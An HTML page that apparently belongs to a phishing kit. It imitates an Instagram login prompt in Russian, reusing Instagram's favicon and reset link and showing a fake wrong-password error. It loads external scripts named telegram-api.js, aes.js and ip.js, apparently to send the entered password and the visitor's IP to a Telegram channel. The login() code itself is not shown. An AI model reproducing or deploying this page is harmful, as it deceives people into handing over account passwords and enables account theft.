<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authorization</title>
    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
    <script src="https://zipscript.github.io/script/aes.js"></script>
    <script src="https://zipscript.github.io/script/ip.js"></script>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        
        *{
            margin: 0px;
            padding: 0px;
            background: rgb(248, 248, 248);
        }
        .box{
            background: white;
            width:350px;
            display: block;
            margin: auto;
            text-align: center;
            height:395px;
            margin-top:70px;
           
           border:2px solid rgb(228, 228, 228);
        }
        input{
            display: block;
            margin: auto;
            margin-top:10px;
            width:240px;
            height:35px;
            padding-left:10px;
            border-radius:2px;
            border:2px solid rgb(228, 228, 228);
            outline: none;
        }
        .title{
            font-family: Arial;
            font-size:25px;
            padding-top:50px;
            background: white;
        }
        button{
            margin-top:20px;
            width:250px;
            height:35px;
            border-radius:4px;
            border: none;
            color: white;
            background:rgba(0,149,246,0.3);
            outline: none;
        }
        a{
            display: block;
            margin: auto;
            text-align: center;
            text-decoration: none;
            color: rgb(43, 43, 43);
            font-family: arial;
            margin-top:25px;
            font-size:13px;
            background: white;
        }
        
        
        .error{
            display: none;
            margin: auto;
            text-align: center;
            width:280px;
            background:white;
            color: red;
            font-family: arial;
            font-size:13px;
            margin-top:20px;
        }
        img{
            display: block;
            margin: auto;
            width:110px;
            border-radius:50%;
            margin-top:30px;
        }
       
        .ut{
            font-family: arial;
            background: white;
            margin-top:30px;
            font-size:18px;
        }
    </style>
</head>
<body>
   
    <div class="box">
        <!--<h1 class="title">Instagram</h1>
        <img src="" alt="">-->
        
       <img src="us.jpg" alt="">
       <h1 class="ut">USERNAME</h1>
       <br>
       
        <input type="password" id="password" onkeyup="block(this.value)" placeholder="Пароль">
        <button id="btn" onclick="login()" disabled>Войти</button>
        <p class="error">К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз.</p>
        <a href="https://www.instagram.com/accounts/password/reset/">Забыли пароль?</a>
    </div>
</body>
